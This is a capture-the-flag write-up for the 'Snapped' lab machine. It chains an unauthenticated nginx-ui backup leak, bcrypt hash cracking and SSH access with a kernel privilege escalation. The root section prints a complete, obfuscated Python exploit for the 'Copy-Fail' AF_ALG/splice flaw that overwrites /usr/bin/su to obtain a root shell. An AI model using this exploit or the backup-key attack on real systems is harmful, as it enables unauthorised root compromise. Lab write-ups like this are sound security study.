# Room: Snapped 
Difficulty: Hard

## Initial Reconnaissance & Enumeration
First things first when doing a pentesting, I started scanning the network for open ports using nmap -sC -sV TARGET_IP -T4
- -sC = default script

- -sV = version detection

- -T4 = fast/aggressive

Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Snapped \xE2\x80\x94 Infrastructure. Orchestration. Control.
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I added snapped.htb to my /etc/hosts.

I started enumerating for subdomains using ffuf and found “admin”. I added it again to my /etc/hosts.

Upon visiting, it was a login panel so I enumerated again for the sub directory and found /mcp but still I was not authorized.

I also fuzzed /api and found /backup which has a zip file containing:

- hash_info.txt

- nginx-ui.zip

- nginx.zip
## CVE-2026-27944
I investigated the file but it was unrecognizable so I began my research and found CVE-2026-27944 where the /api/backup endpoint is accessible without authentication.

I opened Burp to capture the request on /api/backup and found the X-Backup-Security header which contains the key

Example Response:
```
X-Backup-Security: fTFs5NS3QjdjJ9EY//As5YF4FJjaWT6WJUDzzVtrh6s=:yPaS7Iub3j8DB5MXzDBEXA==
```
I used the public exploit: https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762

After decrypting, I grabbed the admin and jonathan hashes on /backup_extracted/nginx-ui/database.db

Hashes:
```
admin:$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvmg
jonathan:$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```
I added them to hashes.txt and cracked them using hashcat -m 3200 (bcrypt).

Cracked hash: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:<REDACTED>

I used the password for Jonathan's SSH and it works!

I got the user.txt on /home/jonathan/user.txt.

## Privilege Escalation Copy-Fail CVE-2026-31431:
``` bash
jonathan@snapped:/etc/cups$ uname -r
6.17.0-19-generic # Vulnerable 4.14 through 6.19 

jonathan@snapped:/etc/cups$ grep -qE '^algif_aead ' /proc/modules && echo "VULNERABLE: Affected module is loaded" || echo "MITIGATED: Affected module is NOT loaded"
VULNERABLE: Affected module is loaded # confirms the vulnerable algif_aead subsystem is live and ready in memory. 

jonathan@snapped:/etc/cups$ cat /etc/modprobe.d/disable-algif*.conf 2>/dev/null # returned nothing, meaning there are no modprobe blacklists blocking unprivileged access to the subsystem.
```
Exploit.py
``` python
#!/usr/bin/env python3
import os as g, zlib, socket as s

def d(x): return bytes.fromhex(x)

def c(f, t, c):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A" * 4 + c], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 32768)
    r, w = g.pipe()
    n = g.splice
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    try: u.recv(8 + t)
    except: 0

f = g.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

while i < len(e):
    c(f, i, e[i:i+4])
    i += 4

g.system("su")
```
Reference: https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/README.md

I then ran the exploit.py and it returns root access. I got the root flag on /root/root.txt.

Note: This bypasses the intended root path by leveraging recent vulnerability trends.

## Attack Chain
The attack began with an Nmap scan identifying open ports for SSH (22) and an Nginx web server (80). Subdomain fuzzing via ffuf revealed an admin subdomain, which hosted a login portal. Continued fuzzing of the API endpoints uncovered an unauthenticated information leak at /api/backup. By capturing the request in Burp Suite, the X-Backup-Security header key was extracted, leveraging CVE-2026-27944 to decrypt a downloaded backup archive containing a SQLite database (database.db). Within the database, bcrypt hashes for the admin and jonathan users were dumped. Using Hashcat (mode 3200), Jonathan's hash was successfully cracked, granting valid credentials to establish a foothold via SSH and capture the user flag.

Internal enumeration of the environment revealed an Ubuntu kernel version 6.17.0, indicating susceptibility to a recently disclosed local privilege escalation vulnerability. Further checking verified that the vulnerable algif_aead subsystem module was active and unmitigated in memory. By uploading and executing a custom Python exploit script targeting the "Copy-Fail" memory corruption flaw (CVE-2026-31431), the socket layer was used to overwrite systemic memory structures during a splice operation involving /usr/bin/su. This forced execution flow to spawn an interactive shell with inherited root privileges, allowing for successful root compromise and retrieval of the final flag.

```
[ Nmap Recon ]
|
v
Open Ports Discovered
(22 SSH / 80 HTTP)
|
v
[ Subdomain Fuzzing (ffuf) ]
(admin.snapped.htb)
|
v
[ API Fuzzing ]
Discovered Leaked Backup Endpoint (/api/backup)
|
v
[ Burp Suite Capture ]
Extracted Cryptographic Key via Header (CVE-2026-27944)
|
v
Decrypted Backup Assets
(Extracted SQLite database.db)
|
v
[ Database Enumeration ]
Dumped Jonathan's Bcrypt Hash ($2a$10$8M7JZ...)
|
v
[ Hash Cracking (Hashcat) ]
Cracked Jonathan's Password
|
v
[ SSH Initial Access ]
Log in as jonathan -> Read /home/jonathan/user.txt
|
v
[ Internal Enumeration ]
Identified Vulnerable Kernel 6.17 & Active algif_aead Module
|
v
[ Local Privilege Escalation ]
Uploaded and Ran copy_fail_exp.py (CVE-2026-31431)
|
v
Memory Corruption via Splice Operations (/usr/bin/su)
|
v
Elevated Shell Spawned as Root
|
v
Read Sensitive File:
/root/root.txt
|
v
[ ROOT COMPROMISE / FLAG ACCESS ]
```
